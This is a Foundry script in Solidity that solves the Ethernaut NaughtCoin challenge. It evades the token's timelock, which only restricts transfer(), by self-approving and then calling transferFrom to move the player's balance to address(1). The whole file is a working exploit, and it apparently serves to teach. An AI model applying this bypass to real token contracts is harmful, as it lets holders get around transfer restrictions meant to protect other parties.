// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// Import Foundry scripting utilities (vm, broadcast, etc.)
import "forge-std/Script.sol";


// Minimal interface to interact with the NaughtCoin contract
// (avoids importing full OpenZeppelin ERC20)
interface INaughtCoin {
    // Allow 'spender' to spend 'amount' tokens on behalf of msg.sender
    function approve(address spender, uint256 amount) external returns (bool);

    // Transfer tokens from 'from' to 'to' using allowance mechanism
    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    // Get token balance of an account
    function balanceOf(address account) external view returns (uint256);
}


contract NaughtCoinSolution is Script {

    // Instance of the deployed NaughtCoin contract (Ethernaut instance)
    INaughtCoin public token =
        INaughtCoin(0xc8fA18aB85Ea7f14428b759B9b3E635610EB2180);

    function run() external {

        // Load private key from environment (.env file)
        uint256 pk = vm.envUint("PRIVATE_KEY");

        // Derive corresponding wallet address from private key
        address player = vm.addr(pk);

        // Start broadcasting transactions to the blockchain
        vm.startBroadcast(pk);

        // Fetch current token balance of the player
        uint256 balance = token.balanceOf(player);

        // ---------------- EXPLOIT START ----------------

        // Step 1: Approve yourself as spender
        // This allows you to use transferFrom() on your own tokens
        token.approve(player, balance);

        // Step 2: Transfer tokens using transferFrom()
        // This bypasses the timelock restriction (which only applies to transfer())
        // Tokens are sent to a dummy address (address(1)) to reduce player's balance
        token.transferFrom(player, address(1), balance);

        // ---------------- EXPLOIT END ----------------

        // Stop broadcasting transactions
        vm.stopBroadcast();
    }
}
